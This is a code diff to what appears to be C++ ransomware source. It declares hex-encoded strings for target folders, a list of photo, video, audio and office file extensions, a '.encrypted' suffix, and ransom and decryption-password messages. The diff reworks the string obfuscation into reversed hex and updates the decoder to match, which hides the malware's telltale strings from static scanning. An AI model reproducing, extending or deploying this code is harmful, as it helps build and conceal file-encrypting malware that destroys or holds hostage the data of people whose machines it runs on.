@@ -41,40 +41,40 @@ bool g_Decrypt = false;
 
 // Encoded String Declarations
 //
-// User StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
+// Use StringToHexGenerator.exe to generate the Hex version of a string you want to obfuscate
 //
-std::string strAppData = "41707044617461"; // AppData
-std::string strAllUsers = "416c6c205573657273"; // All Users
-std::string strPublicAcctPics = "5075626c69635c4163636f756e745069637475726573"; //  Public\\AccountPictures
-std::string strExtBmp = "2e626d70";    // .bmp
-std::string strExtJpg = "2e6a7067";    // .jpg
-std::string strExtJpeg = "2e6a706567"; // .jpeg
-std::string strExtPng = "2e706e67";    // .png
-std::string strExtGif = "2e676966";    // .gif
-std::string strExtMp4 = "2e6d7034";    // .mp4
-std::string strExtMpg = "2e6d7067";    // .mpg
-std::string strExtMpeg = "2e6d706567"; // .mpeg
-std::string strExtMov = "2e6d6f76";    // .mov
-std::string strExtMkv = "2e6d6b76";    // .mkv
-std::string strExtM2ts = "2e6d327473"; // .m2ts
-std::string strExtMp3 = "2e6d7033";    // .mp3
-std::string strExtM4a = "2e6d3461";    // .m4a
-std::string strExtDoc = "2e646f63";    // .doc
-std::string strExtDocx = "2e646f6378"; // .docx
-std::string strExtXls = "2e786c73";    // .xls
-std::string strExtXlsx = "2e786c7378"; // .xlsx
-std::string strExtPpt = "2e707074";    // .ppt
-std::string strExtPptx = "2e70707478"; // .pptx
-std::string strExtPdf = "2e706466";    // .pdf
-std::string strExtTxt = "2e747874";    // .txt
-std::string strExtEncrypted = "2e656e63727970746564"; // .encrypted
-std::string strBanner = "57656c636f6d6520746f20746865204d617472697821"; // "Welcome to the Matrix!"
-std::string strPasswordNeeded = "596f75206d7573742070726f7669646520612070617373776f7264207769746820746865202f64206f7074696f6e20746f20636f6e74696e75652e"; // "You must provide a password with the /d option to continue."
-std::string strPwdMessage = "596f7520656e7465726564207468652070617373776f72643a20"; // "You entered the password: "
-std::string strRecoveryFailed = "5d2066696c6573206661696c656420746f207265636f7665722e2020526572756e207468652070726f6772616d207769746820796f75722070617373776f72642e"; // "] files failed to recover.  Rerun the program with your password."
-std::string strAllYourFilesAreBelongToUs = "416c6c20596f75722046696c6573204172652042656c6f6e6720546f205573212121203a5c"; // "All Your Files Are Belong To Us!!! :\\"
-std::string strAllYourFilesAreBelongToYou = "416c6c20596f75722046696c6573204172652042656c6f6e6720546f20596f75212121203a3e"; // "All Your Files Are Belong To You!!! :>"
-std::string strNotAllYourFilesAreBelongToYou = "4e6f7420416c6c20596f75722046696c6573204172652042656c6f6e6720546f20596f75212121203a3c"; // "Not All Your Files Are Belong To You!!! :<"
+std::string strAppData = "16471644070714"; // AppData
+std::string strAllUsers = "372756375502c6c614"; // All Users
+std::string strPublicAcctPics = "375627574736960547e657f6363614c53696c6265705"; //  Public\\AccountPictures
+std::string strExtBmp  = "07d626e2";   // .bmp
+std::string strExtJpg  = "7607a6e2";   // .jpg
+std::string strExtJpeg = "765607a6e2"; // .jpeg
+std::string strExtPng  = "76e607e2";    // .png
+std::string strExtGif  = "669676e2";    // .gif
+std::string strExtMp4  = "4307d6e2";  // .mp4
+std::string strExtMpg  = "7607d6e2"; // .mpg
+std::string strExtMpeg = "765607d6e2"; // .mpeg
+std::string strExtMov  = "67f6d6e2"; // .mov
+std::string strExtMkv  = "67b6d6e2"; // .mkv
+std::string strExtM2ts = "374723d6e2"; // .m2ts
+std::string strExtMp3  = "3307d6e2"; // .mp3
+std::string strExtM4a  = "1643d6e2"; // .m4a
+std::string strExtDoc  = "36f646e2"; // .doc
+std::string strExtDocx = "8736f646e2"; // .docx
+std::string strExtXls  = "37c687e2"; // .xls
+std::string strExtXlsx = "8737c687e2"; // .xlsx
+std::string strExtPpt  = "470707e2"; // .ppt
+std::string strExtPptx = "87470707e2"; // .pptx
+std::string strExtPdf  = "664607e2"; // .pdf
+std::string strExtTxt  = "478747e2"; // .txt
+std::string strExtEncrypted = "46564707972736e656e2"; // .encrypted
+std::string strBanner = "128796274716d40256864702f6470256d6f636c65675"; // "Welcome to the Matrix!"
+std::string strPasswordNeeded = "e25657e69647e6f63602f64702e6f6964707f60246f2025686470286479677024627f6773737160702160256469667f6270702473757d60257f695"; // "You must provide a password with the /d option to continue."
+std::string strPwdMessage = "02a34627f6773737160702568647024656275647e6560257f695"; // "You entered the password: "
+std::string strRecoveryFailed = "e24627f67737371607022757f697028647967702d6162776f627070256864702e6572756250202e2275667f636562702f647024656c6961666023756c6966602d5"; // "] files failed to recover.  Rerun the program with your password."
+std::string strAllYourFilesAreBelongToUs = "c5a302121212375502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To Us!!! :\\"
+std::string strAllYourFilesAreBelongToYou = "e3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c614"; // "All Your Files Are Belong To You!!! :>"
+std::string strNotAllYourFilesAreBelongToYou = "c3a30212121257f69502f6450276e6f6c6562402562714023756c69664022757f69502c6c6140247f6e4"; // "Not All Your Files Are Belong To You!!! :<"
 
 
 // Function Declarations
@@ -1055,11 +1055,14 @@ void HexToString(const std::string hexstr, std::string & str)
 {
 	// Convert string of Hex numbers to its a std::string
 
-	str.resize((hexstr.size() + 1) / 2);
+	std::string hextmp(hexstr);
+	std::reverse(hextmp.begin(), hextmp.end());
+
+	str.resize((hextmp.size() + 1) / 2);
 
 	for (size_t i = 0, j = 0; i < str.size(); i++, j++)
 	{
-		str[i] = (hexstr[j] & '@' ? hexstr[j] + 9 : hexstr[j]) << 4, j++;
-		str[i] |= (hexstr[j] & '@' ? hexstr[j] + 9 : hexstr[j]) & 0xF;
+		str[i] = (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) << 4, j++;
+		str[i] |= (hextmp[j] & '@' ? hextmp[j] + 9 : hextmp[j]) & 0xF;
 	}
 }
